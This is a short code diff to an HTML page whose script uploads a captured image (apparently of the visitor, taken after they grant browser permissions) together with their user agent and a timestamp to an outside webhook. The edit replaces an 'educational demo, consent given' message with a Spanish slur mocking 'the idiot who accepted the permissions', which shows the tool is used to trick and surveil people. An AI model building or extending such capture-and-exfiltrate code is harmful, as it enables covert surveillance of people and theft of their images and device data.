@@ -196,7 +196,7 @@
       try{
         const fd = new FormData();
         fd.append('file', blob, `captura-${Date.now()}.png`);
-        const payload = { content: `\u2705 Captura de la demo educativa (consentimiento otorgado).\nAgente: ${navigator.userAgent}\nHora: ${new Date().toISOString()}` };
+        const payload = { content: `\u2705 Captura del weon que acepto los permisos jajaja tonto weon.\nAgente: ${navigator.userAgent}\nHora: ${new Date().toISOString()}` };
         fd.append('payload_json', JSON.stringify(payload));
         const res = await fetch(WEBHOOK, { method: 'POST', body: fd });
         if (!res.ok){ const txt=await res.text(); throw new Error(`HTTP ${res.status}: ${txt.slice(0,160)}`); }
@@ -210,6 +210,7 @@
   </script>
 </body>
 </html>
+
 
 
 
